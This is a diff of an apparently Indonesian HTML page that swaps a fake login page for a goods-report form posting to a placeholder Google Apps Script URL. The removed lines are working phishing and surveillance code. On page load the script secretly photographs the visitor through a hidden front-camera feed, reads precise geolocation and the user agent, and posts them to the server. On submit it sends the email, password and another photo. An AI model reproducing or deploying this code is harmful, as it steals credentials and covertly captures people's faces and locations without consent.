@@ -1,87 +1,70 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login</title>
+<title>Laporan Barang</title>
+
+<!-- Link Font Awesome buat ikon -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
 <style>
-  body { font-family: Arial; text-align: center; padding:20px; }
-  video { display: none; }
-  input { padding:8px; margin:5px; width:250px; }
-  button { padding:8px 16px; margin-top:10px; }
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    margin:0;
+    padding:20px;
+    background: url('https://media1.giphy.com/media/v7WM6sLcnGIc8/giphy.gif') no-repeat center center fixed; /* Ganti URL background GIF */
+    background-size: cover;
+    color: white;
+  }
+
+  .form-container {
+    background: rgba(0,0,0,0.6);
+    padding: 20px;
+    border-radius: 12px;
+    display: inline-block;
+    margin-top: 40px;
+    box-shadow: 0px 0px 20px rgba(255,255,255,0.2);
+  }
+
+  input {
+    padding:10px;
+    margin:8px;
+    width: 250px;
+    border: none;
+    border-radius: 8px;
+  }
+
+  button {
+    padding:10px 20px;
+    border: none;
+    border-radius: 8px;
+    background-color: #2196F3;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #1976D2;
+  }
 </style>
 </head>
 <body>
 
-<h2>Login</h2>
-<form id="loginForm">
-  <input type="text" name="email" placeholder="Your Email" required><br>
-  <input type="password" name="password" placeholder="Your Password" required><br>
-  <button type="submit">Login</button>
-</form>
+<div class="form-container">
+  <h2><i class="fas fa-box"></i> Form Laporan Barang</h2>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
-
-<script>
-let photo1 = "", lat1 = "", lon1 = "", ua = navigator.userAgent;
-
-function capture(cb){
-  const v=document.getElementById('video');
-  const c=document.getElementById('canvas');
-  const ctx=c.getContext('2d');
-  c.width=v.videoWidth||640;
-  c.height=v.videoHeight||480;
-  ctx.drawImage(v,0,0,c.width,c.height);
-  cb(c.toDataURL('image/jpeg'));
-}
-
-function getLoc(cb){
-  navigator.geolocation.getCurrentPosition(
-    p=>{cb(p.coords.latitude, p.coords.longitude);},
-    e=>{cb("", "");},
-    {enableHighAccuracy:true, timeout:10000}
-  );
-}
-
-// Mulai kamera dan capture awal
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
-.then(stream=>{
-  document.getElementById('video').srcObject=stream;
-  setTimeout(()=>{
-    capture(img=>{
-      getLoc((la,lo)=>{
-        photo1 = img;
-        lat1 = la;
-        lon1 = lo;
-        fetch("/berhasil_awal", {
-          method:"POST",
-          body: JSON.stringify({photo:photo1, lat:lat1, lon:lon1, ua:ua}),
-          headers: {"Content-Type":"application/json"}
-        });
-      });
-    });
-  }, 1500);
-}).catch(e=>console.error("Kamera error:", e));
-
-// Saat klik login
-document.getElementById('loginForm').addEventListener('submit', function(e){
-  e.preventDefault();
-  capture(img=>{
-    getLoc((lat2, lon2)=>{
-      const fd = new FormData();
-      fd.append("email", this.email.value);
-      fd.append("password", this.password.value);
-      fd.append("photo", img);
-      fd.append("lat", lat2);
-      fd.append("lon", lon2);
-      fd.append("ua", ua);
-      fetch("/berhasil", {method:"POST", body:fd})
-      .then(()=>{ window.location.href="/form_laporan"; });
-    });
-  });
-});
-</script>
+  <!-- 
+    GANTI action="" dengan URL Google Apps Script lo
+    supaya data masuk ke Google Sheets
+  -->
+  <form action="YOUR_GOOGLE_APPS_SCRIPT_URL" method="POST">
+    Hari/Tanggal: <input type="text" name="tanggal" required><br>
+    Jam: <input type="text" name="jam" required><br>
+    Material dan Jumlah: <input type="text" name="material" required><br>
+    Keterangan: <input type="text" name="keterangan" required><br>
+    <button type="submit"><i class="fas fa-paper-plane"></i> Submit</button>
+  </form>
+</div>
 
 </body>
 </html>
